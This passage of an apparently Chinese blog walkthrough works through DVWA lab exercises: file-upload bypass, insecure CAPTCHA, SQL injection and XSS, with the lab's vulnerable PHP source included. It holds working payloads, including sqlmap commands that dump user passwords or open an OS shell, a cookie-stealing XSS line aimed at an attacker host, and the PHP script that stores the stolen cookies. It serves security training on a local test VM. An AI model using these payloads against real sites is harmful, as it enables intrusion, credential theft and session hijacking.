ini_get( &#x27;upload_tmp_dir&#x27; ) == &#x27;&#x27; ) ? ( sys_get_temp_dir() ) : ( ini_get( &#x27;upload_tmp_dir&#x27; ) ) ); $temp_file .= DIRECTORY_SEPARATOR . md5( uniqid() . $uploaded_name ) . &#x27;.&#x27; . $uploaded_ext; // Is it an image? if( ( strtolower( $uploaded_ext ) == &#x27;jpg&#x27; || strtolower( $uploaded_ext ) == &#x27;jpeg&#x27; || strtolower( $uploaded_ext ) == &#x27;png&#x27; ) &amp;&amp; ( $uploaded_size &lt; 100000 ) &amp;&amp; ( $uploaded_type == &#x27;image/jpeg&#x27; || $uploaded_type == &#x27;image/png&#x27; ) &amp;&amp; getimagesize( $uploaded_tmp ) ) &#123; // Strip any metadata, by re-encoding image (Note, using php-Imagick is recommended over php-GD) if( $uploaded_type == &#x27;image/jpeg&#x27; ) &#123; $img = imagecreatefromjpeg( $uploaded_tmp ); imagejpeg( $img, $temp_file, 100); &#125; else &#123; $img = imagecreatefrompng( $uploaded_tmp ); imagepng( $img, $temp_file, 9); &#125; imagedestroy( $img ); // Can we move the file to the web root from the temp folder? if( rename( $temp_file, ( getcwd() . DIRECTORY_SEPARATOR . $target_path . $target_file ) ) ) &#123; // Yes! echo &quot;&lt;pre&gt;&lt;a href=&#x27;$&#123;target_path&#125;$&#123;target_file&#125;&#x27;&gt;$&#123;target_file&#125;&lt;/a&gt; succesfully uploaded!&lt;/pre&gt;&quot;; &#125; else &#123; // No echo &#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;; &#125; // Delete any temp files if( file_exists( $temp_file ) ) unlink( $temp_file ); &#125; else &#123; // Invalid file echo &#x27;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#x27;; &#125;&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt;//High File Upload Source&lt;?phpif( isset( $_POST[ &#x27;Upload&#x27; ] ) ) &#123; // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;; $target_path .= basename( $_FILES[ &#x27;uploaded&#x27; ][ &#x27;name&#x27; ] ); // File information $uploaded_name = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;name&#x27; ]; $uploaded_ext = substr( $uploaded_name, strrpos( $uploaded_name, &#x27;.&#x27; ) + 1); $uploaded_size = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;size&#x27; ]; $uploaded_tmp = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;tmp_name&#x27; ]; // Is it an image? if( ( strtolower( $uploaded_ext ) == &quot;jpg&quot; || strtolower( $uploaded_ext ) == &quot;jpeg&quot; || strtolower( $uploaded_ext ) == &quot;png&quot; ) &amp;&amp; ( $uploaded_size &lt; 100000 ) &amp;&amp; getimagesize( $uploaded_tmp ) ) &#123; // Can we move the file to the upload folder? if( !move_uploaded_file( $uploaded_tmp, $target_path ) ) &#123; // No echo &#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;; &#125; else &#123; // Yes! echo &quot;&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;&quot;; &#125; &#125; else &#123; // Invalid file echo &#x27;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#x27;; &#125;&#125;?&gt;//Medium File Upload Source&lt;?phpif( isset( $_POST[ &#x27;Upload&#x27; ] ) ) &#123; // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;; $target_path .= basename( $_FILES[ &#x27;uploaded&#x27; ][ &#x27;name&#x27; ] ); // File information $uploaded_name = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;name&#x27; ]; $uploaded_type = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;type&#x27; ]; $uploaded_size = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;size&#x27; ]; // Is it an image? if( ( $uploaded_type == &quot;image/jpeg&quot; || $uploaded_type == &quot;image/png&quot; ) &amp;&amp; ( $uploaded_size &lt; 100000 ) ) &#123; // Can we move the file to the upload folder? if( !move_uploaded_file( $_FILES[ &#x27;uploaded&#x27; ][ &#x27;tmp_name&#x27; ], $target_path ) ) &#123; // No echo &#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;; &#125; else &#123; // Yes! echo &quot;&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;&quot;; &#125; &#125; else &#123; // Invalid file echo &#x27;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#x27;; &#125;&#125;?&gt;//Low File Upload Source&lt;?phpif( isset( $_POST[ &#x27;Upload&#x27; ] ) ) &#123; // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;; $target_path .= basename( $_FILES[ &#x27;uploaded&#x27; ][ &#x27;name&#x27; ] ); // Can we move the file to the upload folder? if( !move_uploaded_file( $_FILES[ &#x27;uploaded&#x27; ][ &#x27;tmp_name&#x27; ], $target_path ) ) &#123; // No echo &#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;; &#125; else &#123; // Yes! echo &quot;&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;&quot;; &#125;&#125;?&gt; # Low 随便上传，无限制 # Medium 限制文件类型，但是可以改包上传 Content-Type: image/png 1234567891011121314151617181920212223242526272829303132333435363738394041POST /dvwa/vulnerabilities/upload/ HTTP/1.1Host: 192.168.23.133User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateContent-Type: multipart/form-data; boundary=---------------------------24238774263872546046514723521Content-Length: 977Origin: http://192.168.23.133Connection: closeReferer: http://192.168.23.133/dvwa/vulnerabilities/upload/Cookie: security=low; PHPSESSID=otpvh75rdm983qnfc0scstgns0Upgrade-Insecure-Requests: 1-----------------------------24238774263872546046514723521Content-Disposition: form-data; name=&quot;MAX_FILE_SIZE&quot;100000-----------------------------24238774263872546046514723521Content-Disposition: form-data; name=&quot;uploaded&quot;; filename=&quot;a.txt&quot;Content-Type: image/png txt 上传成功 1../../hackable/uploads/a.txt succesfully uploaded! # High 加入内容检测和文件类型检测 通过在图片中加入一句话木马实现上传 1echo &quot;&lt;? phpinfo() ?&gt;&quot; &gt;&gt;th.jpeg 1../../hackable/uploads/th.jpeg succesfully uploaded! 通过文件包含漏洞解析上传图片 1?page=file:///var/www/html/dvwa//hackable/uploads/th.jpeg # Insecure CAPTCHA # Low 修改包的参数 step=2 即可。 123step=2&amp;password_new=123&amp;password_conf=123&amp;Change=ChangePassword Changed. # Medium 修改包的参数 step=2。 查看源码得知新变量 passed_captcha，谷歌返回情况，将其 POST 为 true。 1step=2&amp;password_new=123&amp;password_conf=123&amp;Change=Change&amp;passed_captcha=true # High 添加如下信息至包中 123User-Agent: reCAPTCHAstep=1&amp;password_new=123&amp;password_conf=123&amp;user_token=2143b157158c8dce48d7b94d045bad71&amp;Change=Change&amp;g-recaptcha-response=hidd3n_valu3 # SQL Injection 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122//SQL Injection//Impossible SQL Injection Source&lt;?phpif( isset( $_GET[ &#x27;Submit&#x27; ] ) ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ &#x27;user_token&#x27; ], $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; ); // Get input $id = $_GET[ &#x27;id&#x27; ]; // Was a number entered? if(is_numeric( $id )) &#123; // Check the database $data = $db-&gt;prepare( &#x27;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&#x27; ); $data-&gt;bindParam( &#x27;:id&#x27;, $id, PDO::PARAM_INT ); $data-&gt;execute(); $row = $data-&gt;fetch(); // Make sure only 1 result is returned if( $data-&gt;rowCount() == 1 ) &#123; // Get values $first = $row[ &#x27;first_name&#x27; ]; $last = $row[ &#x27;last_name&#x27; ]; // Feedback for end user echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;; &#125; &#125;&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt;//High SQL Injection Source&lt;?phpif( isset( $_SESSION [ &#x27;id&#x27; ] ) ) &#123; // Get input $id = $_SESSION[ &#x27;id&#x27; ]; // Check database $query = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;$id&#x27; LIMIT 1;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#x27;&lt;pre&gt;Something went wrong.&lt;/pre&gt;&#x27; ); // Get results while( $row = mysqli_fetch_assoc( $result ) ) &#123; // Get values $first = $row[&quot;first_name&quot;]; $last = $row[&quot;last_name&quot;]; // Feedback for end user echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); &#125;?&gt;//Medium SQL Injection Source&lt;?phpif( isset( $_POST[ &#x27;Submit&#x27; ] ) ) &#123; // Get input $id = $_POST[ &#x27;id&#x27; ]; $id = mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $id); $query = &quot;SELECT first_name, last_name FROM users WHERE user_id = $id;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query) or die( &#x27;&lt;pre&gt;&#x27; . mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) . &#x27;&lt;/pre&gt;&#x27; ); // Get results while( $row = mysqli_fetch_assoc( $result ) ) &#123; // Display values $first = $row[&quot;first_name&quot;]; $last = $row[&quot;last_name&quot;]; // Feedback for end user echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;; &#125;&#125;// This is used later on in the index.php page// Setting it here so we can close the database connection in here like in the rest of the source scripts$query = &quot;SELECT COUNT(*) FROM users;&quot;;$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; );$number_of_rows = mysqli_fetch_row( $result )[0];mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]);?&gt;//Low SQL Injection Source&lt;?phpif( isset( $_REQUEST[ &#x27;Submit&#x27; ] ) ) &#123; // Get input $id = $_REQUEST[ &#x27;id&#x27; ]; // Check database $query = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;$id&#x27;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; ); // Get results while( $row = mysqli_fetch_assoc( $result ) ) &#123; // Get values $first = $row[&quot;first_name&quot;]; $last = $row[&quot;last_name&quot;]; // Feedback for end user echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;; &#125; mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]);&#125;?&gt; # Low 特点：GET 1 1’//wrong 1’ or 1=1– 1’ union select 1,database()– sqlmap 1sqlmap -u &quot;http://0.0.0.0/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie &quot;security=low; PHPSESSID=cqve1uen4svrvfnlga3j892sb4&quot; -D dvwa -T users -C user,password --dump # Medium 特点：POST 手工注入 id=1 union select 1,table_name from information_schema=dvwa– HEX 加密关键字 id=1 union select 1,table_name from information_schema=0x64767761– sqlmap --data 参数 123456#脱裤sqlmap -u &quot;http://192.168.23.133/dvwa/vulnerabilities/sqli/#&quot; --data &quot;id=2&amp;Submit=Submit&quot; --cookie &quot;security=medium; PHPSESSID=cqve1uen4svrvfnlga3j892sb4&quot; -D dvwa -T users -C user,password --dump --batch#上马lmap -u &quot;http://192.168.23.133/dvwa/vulnerabilities/sqli/#&quot; --data &quot;id=2&amp;Submit=Submit&quot; --cookie &quot;security=medium; PHPSESSID=cqve1uen4svrvfnlga3j892sb4&quot; -D dvwa -T users -C user,password --os-shell#需要加绝对路径，可以利用phpinfo() # High 特点：返回到不同页面 手动无差别 sqlmap --second-url 参数 1sqlmap -u &quot;http://192.168.23.133/dvwa/vulnerabilities/sqli/session-input.php&quot; --data &quot;id=2&amp;Submit=Submit&quot; --cookie &quot;security=high; PHPSESSID=cqve1uen4svrvfnlga3j892sb4&quot; --second-url &quot;http://192.168.23.133/dvwa/vulnerabilities/sqli/&quot;-D dvwa -T users -C user,password --dump --batch # SQL Injection (Blind) # Low 手注过于麻烦不演示 sqlmap 12sqlmap -u &quot;http://192.168.23.133/dvwa/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&quot; -p &quot;id&quot; --cookie &quot;security=low; PHPSESSID=f48dupm9bkmo862t404a2hmvl1&quot; -D dvwa -T users -C user,password --dump --batch # Medium 12sqlmap -u&quot;http://192.168.23.133/dvwa/vulnerabilities/sqli_blind/#&quot; --data &quot;id=1&amp;Submit=Submit&quot; -p &quot;id&quot; --cookie &quot;security=medium; PHPSESSID=o5v0fkp2cld3nef9aninvap224&quot; -D dvwa -T users -C user,password --dump --batch # High 1sqlmap -u &quot;192.168.23.133/dvwa/vulnerabilities/sqli_blind/cookie-input.php&quot; --data &quot;id=2&amp;Submit=Submit&quot; --cookie &quot;id=1; security=high; PHPSESSID=o5v0fkp2cld3nef9aninvap224&quot; --second-url &quot;http://192.168.23.133/dvwa/vulnerabilities/sqli_blind/&quot; -D dvwa -T users -C user,password --dump --batch # Weak Session IDs # Low # Medium # High # DOM Based Cross Site Scripting (XSS) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354//DOM Based Cross Site Scripting (XSS) Vulnerability//Impossible Unknown Vulnerability Source&lt;?php# Don&#x27;t need to do anything, protction handled on the client side?&gt;//High Unknown Vulnerability Source&lt;?php// Is there any input?if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ &#x27;default&#x27; ]) ) &#123; # White list the allowable languages switch ($_GET[&#x27;default&#x27;]) &#123; case &quot;French&quot;: case &quot;English&quot;: case &quot;German&quot;: case &quot;Spanish&quot;: # ok break; default: header (&quot;location: ?default=English&quot;); exit; &#125;&#125;?&gt;//Medium Unknown Vulnerability Source&lt;?php// Is there any input?if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ &#x27;default&#x27; ]) ) &#123; $default = $_GET[&#x27;default&#x27;]; # Do not allow script tags if (stripos ($default, &quot;&lt;script&quot;) !== false) &#123; header (&quot;location: ?default=English&quot;); exit; &#125;&#125;?&gt;//Low Unknown Vulnerability Source&lt;?php# No protections, anything goes?&gt; # Low 1&lt;script&gt;alert(/xss/)&lt;/script&gt; # Medium 1&lt;/option&gt;&lt;/select&gt;&lt;option&gt;&lt;select&gt;&lt;img%20src=&quot;x&quot;%20onerror=&quot;alert(1)&quot;/&gt; # High 12English#&lt;script&gt;alert(/xss/);&lt;/script&gt;#之后的被过滤，不传到服务端 # Reflected Cross Site Scripting (XSS) 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667//Reflected XSS//Impossible Reflected XSS Source&lt;?php// Is there any input?if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#x27;name&#x27; ] != NULL ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ &#x27;user_token&#x27; ], $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; ); // Get input $name = htmlspecialchars( $_GET[ &#x27;name&#x27; ] ); // Feedback for end user echo &quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;;&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt;//High Reflected XSS Source&lt;?phpheader (&quot;X-XSS-Protection: 0&quot;);// Is there any input?if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#x27;name&#x27; ] != NULL ) &#123; // Get input $name = preg_replace( &#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;, &#x27;&#x27;, $_GET[ &#x27;name&#x27; ] ); // Feedback for end user echo &quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;;&#125;?&gt;//Medium Reflected XSS Source&lt;?phpheader (&quot;X-XSS-Protection: 0&quot;);// Is there any input?if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#x27;name&#x27; ] != NULL ) &#123; // Get input $name = str_replace( &#x27;&lt;script&gt;&#x27;, &#x27;&#x27;, $_GET[ &#x27;name&#x27; ] ); // Feedback for end user echo &quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;;&#125;?&gt;//Low Reflected XSS Source&lt;?phpheader (&quot;X-XSS-Protection: 0&quot;);// Is there any input?if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#x27;name&#x27; ] != NULL ) &#123; // Feedback for end user echo &#x27;&lt;pre&gt;Hello &#x27; . $_GET[ &#x27;name&#x27; ] . &#x27;&lt;/pre&gt;&#x27;;&#125;?&gt; # Low 12&lt;script&gt;alert(/xss/)&lt;/script&gt; alert() confirm() prompt() # Medium 嵌套过滤、大小写转换 12&lt;scri&lt;script&gt;pt&gt;&lt;ScrIpT&gt; url 编码 通过诱导受害人点击页面隐藏提交 name 值，访问攻击网站的 php 脚本获取用户 cookie，从而劫持会话。 123&lt;script&gt;DOCUMENT.location=&quot;http://攻击IP/cookie.php&quot;&lt;/script&gt;需要进行url编码%3Cscript%3EDOCUMENT.location%3D%22http%3A%2F%2FIP%2Fcookie.php%22%3C%2Fscript%3E 将保存的 cookie 用于登录被攻击账户 1234&lt;?php$cookie=$_GET[&#x27;cookie&#x27;];file_put_contents(&#x27;cookie.txt&#x27;,$cookie);?&gt; # High script 被过滤 使用其他标签 12&lt;img src=&quot;x&quot; onerror=&quot;alert(1)&quot;&gt;&lt;iframe onload=alert(1)&gt; # Stored Cross Site Scripting (XSS) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111//Stored XSS//Impossible Stored XSS Source&lt;?phpif( isset( $_POST[ &#x27;btnSign&#x27; ] ) ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ &#x27;user_token&#x27; ], $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; ); // Get input $message = trim( $_POST[ &#x27;mtxMessage&#x27; ] ); $name = trim( $_POST[ &#x27;txtName&#x27; ] ); // Sanitize message input $message = stripslashes( $message ); $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $message = htmlspecialchars( $message ); // Sanitize name input $name = stripslashes( $name ); $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $name = htmlspecialchars( $name ); // Update database $data = $db-&gt;prepare( &#x27;INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );&#x27; ); $data-&gt;bindParam( &#x27;:message&#x27;, $message, PDO::PARAM_STR ); $data-&gt;bindParam( &#x27;:name&#x27;, $name, PDO::PARAM_STR ); $data-&gt;execute();&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt;//High Stored XSS Source&lt;?phpif( isset( $_POST[ &#x27;btnSign&#x27; ] ) ) &#123; // Get input $message = trim( $_POST[ &#x27;mtxMessage&#x27; ] ); $name = trim( $_POST[ &#x27;txtName&#x27; ] ); // Sanitize message input $message = strip_tags( addslashes( $message ) ); $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $message = htmlspecialchars( $message ); // Sanitize name input $name = preg_replace( &#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;, &#x27;&#x27;, $name ); $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Update database $query = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;$message&#x27;, &#x27;$name&#x27; );&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; ); //mysql_close();&#125;?&gt;//Medium Stored XSS Source&lt;?phpif( isset( $_POST[ &#x27;btnSign&#x27; ] ) ) &#123; // Get input $message = trim( $_POST[ &#x27;mtxMessage&#x27; ] ); $name = trim( $_POST[ &#x27;txtName&#x27; ] ); // Sanitize message input $message = strip_tags( addslashes( $message ) ); $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $message = htmlspecialchars( $message ); // Sanitize name input $name = str_replace( &#x27;&lt;script&gt;&#x27;, &#x27;&#x27;, $name ); $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Update database $query = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;$message&#x27;, &#x27;$name&#x27; );&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; ); //mysql_close();&#125;?&gt;//Low Stored XSS Source&lt;?phpif( isset( $_POST[ &#x27;btnSign&#x27; ] ) ) &#123; // Get input $message = trim( $_POST[ &#x27;mtxMessage&#x27; ] ); $name = trim( $_POST[ &#x27;txtName&#x27; ] ); // Sanitize message input $message = stripslashes( $message ); $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Sanitize name input $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Update database $query = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;$message&#x27;, &#x27;$name&#x27; );&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; ); //mysql_close();&#125;?&gt; # Low 与反射形类似 # Medium 与反射形类似 # High 与反射形类似","categories":[],"tags":[{"name":"安全","slug":"安全","permalink":"http://example.com/tags/%E5%AE%89%E5%85%A8/"}]}],"categories":[{"name":"Hive","slug":"Hive","permalink":"http://example.com/categories/Hive/"},{"name":"TensorFlow笔记","slug":"TensorFlow笔记","permalink":"http://example.com/categories/TensorFlow%E7%AC%94%E8%AE%B0/"},{"name":"天池机器学习入门","slug":"天池机器学习入门","permalink":"http://example.com/categories/%E5%A4%A9%E6%B1%A0%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%85%A5%E9%97%A8/"},{"name":"机器学习课程(魏)","slug":"机器学习课程-魏","permalink":"http://example.com/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E8%AF%BE%E7%A8%8B-%E9%AD%8F/"},{"name":"Spark学习","slug":"Spark学习","permalink":"http://example.com/categories/Spark%E5%AD%A6%E4%B9%A0/"},{"name":"平台","slug":"平台","permalink":"http://example.com/categories/%E5%B9%B3%E5%8F%B0/"},{"name":"鸿蒙设备开发(hi3861)","slug":"鸿蒙设备开发-hi3861","permalink":"http://example.com/categories/%E9%B8%BF%E8%92%99%E8%AE%BE%E5%A4%87%E5%BC%80%E5%8F%91-hi3861/"},{"name":"C Primer Plus(第六版)","slug":"C-Primer-Plus-第六版","permalink":"http://example.com/categories/C-Primer-Plus-%E7%AC%AC%E5%85%AD%E7%89%88/"}],"tags":[{"name":"大数据","slug":"大数据","permalink":"http://example.com/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE/"},{"name":"机器学习","slug":"机器学习","permalink":"http://example.com/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"},{"name":"Shell","slug":"Shell","permalink":"http://example.com/tags/Shell/"},{"name":"鸿蒙","slug":"鸿蒙","permalink":"http://example.com/tags/%E9%B8%BF%E8%92%99/"},{"name":"单片机","slug":"单片机","permalink":"http://example.com/tags/%E5%8D%95%E7%89%87%E6%9C%BA/"},{"name":"平台","slug":"平台","permalink":"http://example.com/tags/%E5%B9%B3%E5%8F%B0/"},{"name":"C","slug":"C","permalink":"http://example.com/tags/C/"},{"name":"Python","slug":"Python","permalink":"http://example.com/tags/Python/"},{"name":"安全","slug":"安全","permalink":"http://example.com/tags/%E5%AE%89%E5%85%A8/"}]}